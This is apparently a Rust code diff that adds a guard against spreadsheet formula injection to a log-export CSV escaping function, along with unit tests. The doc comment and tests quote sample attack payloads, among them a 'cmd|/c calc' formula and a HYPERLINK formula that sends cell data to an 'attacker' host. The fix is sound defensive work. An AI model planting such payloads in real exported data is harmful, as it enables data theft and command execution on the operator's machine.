@@ -308,12 +308,34 @@ impl LogExportQuery {
     }
 }
 
-/// Escape a field value for CSV output (RFC 4180).
+/// Escape a field value for CSV output (RFC 4180) AND defuse
+/// spreadsheet formula injection.
+///
+/// RFC 4180 covers parsing safety (quote fields containing `"`, `,`,
+/// `\n`, `\r`). It does NOT cover the OWASP "CSV injection" / "formula
+/// injection" attack class : Excel / LibreOffice / Google Sheets
+/// auto-evaluate any cell whose first character is `=`, `+`, `-`, `@`,
+/// tab, or CR. An attacker who lands a payload in any access-log
+/// field that the operator later exports (request `path`, `host`,
+/// `error`, `client_ip`) plants `=cmd|'/c calc'!A1` or
+/// `=HYPERLINK("http://attacker/?x="&A1,"click")` ; opening the CSV
+/// in a spreadsheet auto-runs the formula against the operator's
+/// trust context. The fix is a leading apostrophe : Excel and the
+/// Calc/Sheets clones treat `'=...` as a literal text cell. The
+/// apostrophe itself is consumed by the spreadsheet parser, so a
+/// human-readable export still shows `=...` in the rendered cell.
+/// v1.5.2 audit M-2.
 fn csv_escape(s: &str) -> String {
-    if s.contains('"') || s.contains(',') || s.contains('\n') || s.contains('\r') {
-        format!("\"{}\"", s.replace('"', "\"\""))
-    } else {
-        s.to_string()
+    let needs_formula_guard = s
+        .as_bytes()
+        .first()
+        .is_some_and(|b| matches!(b, b'=' | b'+' | b'-' | b'@' | b'\t' | b'\r'));
+    let needs_quoting = s.contains('"') || s.contains(',') || s.contains('\n') || s.contains('\r');
+    match (needs_formula_guard, needs_quoting) {
+        (false, false) => s.to_string(),
+        (true, false) => format!("'{s}"),
+        (false, true) => format!("\"{}\"", s.replace('"', "\"\"")),
+        (true, true) => format!("\"'{}\"", s.replace('"', "\"\"")),
     }
 }
 
@@ -644,6 +666,56 @@ mod tests {
     #[test]
     fn test_csv_escape_with_newline() {
         assert_eq!(csv_escape("line1\nline2"), "\"line1\nline2\"");
+    }
+
+    // v1.5.2 audit M-2 : OWASP CSV / formula injection guard.
+
+    #[test]
+    fn test_csv_escape_formula_equals_gets_apostrophe_guard() {
+        assert_eq!(csv_escape("=cmd|'/c calc'!A1"), "'=cmd|'/c calc'!A1");
+    }
+
+    #[test]
+    fn test_csv_escape_formula_plus_gets_apostrophe_guard() {
+        assert_eq!(csv_escape("+1+1"), "'+1+1");
+    }
+
+    #[test]
+    fn test_csv_escape_formula_minus_gets_apostrophe_guard() {
+        // SUM-prefixed payloads ; bare leading minus is also evaluated
+        // as a formula by Excel.
+        assert_eq!(csv_escape("-2+3"), "'-2+3");
+    }
+
+    #[test]
+    fn test_csv_escape_formula_at_gets_apostrophe_guard() {
+        // Excel `@` is the implicit-intersection operator, can pivot
+        // into a formula context on some versions.
+        assert_eq!(csv_escape("@SUM(A1)"), "'@SUM(A1)");
+    }
+
+    #[test]
+    fn test_csv_escape_formula_tab_gets_apostrophe_guard() {
+        assert_eq!(csv_escape("\t=1"), "'\t=1");
+    }
+
+    #[test]
+    fn test_csv_escape_formula_with_comma_double_wrapped() {
+        // Both formula guard AND quote-wrap : `=A,B` needs the
+        // apostrophe inside the RFC 4180 quote wrap.
+        assert_eq!(csv_escape("=A,B"), "\"'=A,B\"");
+    }
+
+    #[test]
+    fn test_csv_escape_legitimate_dash_inside_field_unaffected() {
+        // Only the LEADING char triggers the formula guard. A dash
+        // anywhere else is left alone (e.g. ISO timestamps).
+        assert_eq!(csv_escape("2026-04-26T12:00:00Z"), "2026-04-26T12:00:00Z");
+    }
+
+    #[test]
+    fn test_csv_escape_empty_field_unaffected() {
+        assert_eq!(csv_escape(""), "");
     }
 
     #[test]
